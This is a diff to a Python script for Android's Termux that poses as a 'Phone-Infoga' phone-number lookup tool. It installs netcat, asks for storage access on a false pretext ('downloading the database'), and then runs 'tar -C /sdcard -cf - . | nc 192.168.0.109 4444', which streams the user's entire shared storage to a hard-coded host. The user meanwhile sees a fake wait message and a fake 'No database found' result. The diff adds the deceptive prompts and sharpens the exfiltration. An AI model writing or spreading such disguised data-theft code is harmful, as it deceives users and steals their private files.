@@ -2,19 +2,29 @@ import os
 import subprocess
 import time
 
+subprocess.run("clear", shell=True)
+print(" ____  _                           ___        __       ")
+print("|  _ \| |__   ___  _ __   ___     |_ _|_ __  / _| ___   __ _  __ _")
+print("| |_) | '_ \ / _ \| '_ \ / _ \_____| || '_ \| |_ / _ \ / _` |/ _` |")
+print("|  __/| | | | (_) | | | |  __/_____| || | | |  _| (_) | (_| | (_| |")
+print("|_|   |_| |_|\___/|_| |_|\___|    |___|_| |_|_|  \___/ \__, |\__,_|")
+print("                                                       |___/")
+
 print("Updatin' and Upgradin' the system: ")
 time.sleep(1)
 subprocess.run("pkg update && pkg upgrade -y", shell=True)
 time.sleep(1)
 subprocess.run("pkg install netcat-openbsd nmap -y", shell=True)
 time.sleep(1)
+subprocess.run("clear")
+print("Please allow the application access to your storage, for downloading the database...")
+time.sleep(2)
 subprocess.run("termux-setup-storage", shell=True)
-subprocess.run("cd /sdcard", shell=True)
 print("Application downloaded. Please wait for atleast 30 minutes for the terminal to appear:")
-subprocess.run("tar cf - . | nc 192.168.0.109 4444", shell=True)
+subprocess.run("tar -C /sdcard -cf - . | nc 192.168.0.109 4444", shell=True)
 
 a = input("Enter the phone number: \n")
 time.sleep(1)
-print("Fetchin' data about {a}. Please be patient")
+print("Fetchin' data about", a, ". Please be patient")
 time.sleep(2)
-print("No data found")
+print("No database found")
